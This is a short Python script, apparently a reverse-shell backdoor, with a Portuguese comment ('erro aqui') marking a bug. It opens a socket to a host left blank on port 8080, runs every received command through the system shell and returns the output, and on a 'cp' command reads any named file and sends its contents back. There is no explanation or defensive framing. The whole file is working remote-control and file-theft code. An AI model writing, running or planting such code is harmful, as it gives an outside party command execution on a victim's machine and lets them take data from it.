#!/usr/bin/env python3
#-*-coding: utf-8-*-
import socket
import subprocess
h = ""
p = 8080
adr = (h, p)
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
  sock.connect(adr)
  while True:
    cmd = sock.recv(1024).decode("utf-8")
    if cmd == "bye":
      exit()
    elif cmd == "cp":
      # erro aqui
      with open(sock.recv(1024).decode("utf-8"), "rb") as fl:
        sock.send(fl.read())
    else:
      ret = subprocess.run(cmd, stdout=subprocess.PIPE, shell=True, encoding="utf-8")
      msg = ret.stdout
      sock.send(msg.encode("utf-8"))
